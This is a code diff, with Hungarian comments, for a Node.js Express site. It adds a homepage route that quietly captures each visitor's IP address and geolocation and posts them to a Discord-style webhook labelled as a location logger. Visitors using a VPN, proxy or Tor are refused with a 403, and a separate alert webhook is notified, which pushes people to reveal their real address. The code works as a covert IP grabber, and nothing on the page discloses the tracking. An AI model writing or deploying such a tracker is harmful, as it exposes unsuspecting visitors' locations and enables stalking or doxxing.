@@ -90,7 +90,47 @@ async function isVpnProxy(ip) {
   }
 }
 
-// --- Dinamikus oldalak: pl. /szaby, /kecske, /barmi ---
+// --- Főoldal (/) ---   <<< EZ A FŐOLDAL (szaby) --->
+app.get('/', async (req, res) => {
+  const ip = getClientIp(req);
+  const geoData = await getGeo(ip);
+
+  // LOGOLÁS - itt direkt "szaby"-t írunk az oldalhoz!
+  axios.post(MAIN_WEBHOOK, {
+    username: "Helyszíni Naplózó <3",
+    avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
+    content: '',
+    embeds: [{
+      title: 'Új látogató az oldalon!',
+      description: `**Oldal:** /szaby\n` +      // <- ITT!!!
+                   `**IP-cím:** ${ip}\n` +
+                   formatGeoDataMagyar(geoData),
+      color: 0x800080
+    }]
+  }).catch(()=>{});
+
+  // VPN/PROXY ellenőrzés és ALERT log
+  if (await isVpnProxy(ip)) {
+    axios.post(ALERT_WEBHOOK, {
+      username: "VPN figyelő <3",
+      avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
+      content: '',
+      embeds: [{
+        title: 'VPN/proxy vagy TOR-ral próbálkozás!',
+        description: `**Oldal:** /szaby\n` +
+                     `**IP-cím:** ${ip}\n` +
+                     formatGeoDataMagyar(geoData),
+        color: 0xff0000
+      }]
+    }).catch(()=>{});
+    return res.status(403).send('VPN/proxy vagy TOR használata tiltott ezen az oldalon! 🚫');
+  }
+
+  // index.html visszaadása (főoldal)
+  res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
+// --- Dinamikus oldalak: pl. /kecske, /barmi ---
 app.get('/:folder', async (req, res, next) => {
   const folderName = req.params.folder;
   if (folderName === 'report') return next();
